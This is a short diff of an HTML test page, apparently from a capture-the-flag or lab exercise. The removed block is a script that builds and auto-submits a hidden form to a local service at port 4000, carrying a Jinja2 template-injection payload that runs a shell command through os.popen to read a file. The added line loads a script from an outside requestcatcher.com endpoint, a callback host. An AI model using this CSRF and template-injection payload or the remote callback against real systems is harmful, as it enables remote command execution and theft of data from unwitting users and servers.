@@ -6,19 +6,6 @@
 </head>
 <body>
   <h1>test</h1>
-  <script>
-    (()=>{
-      const f = document.createElement('form');
-      f.method = 'POST';
-      f.action = 'http://127.0.0.1:4000/';
-      const i = document.createElement('input');
-      i.type = 'hidden';
-      i.name = 'comment';
-      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('cat /usr/local/bin/cleanup.sh').read()}}`;
-      f.appendChild(i);
-      document.body.appendChild(f);
-      f.submit();
-    })();
-  </script>
+  <script src="https://singetu0096.requestcatcher.com/"></script>
 </body>
 </html>
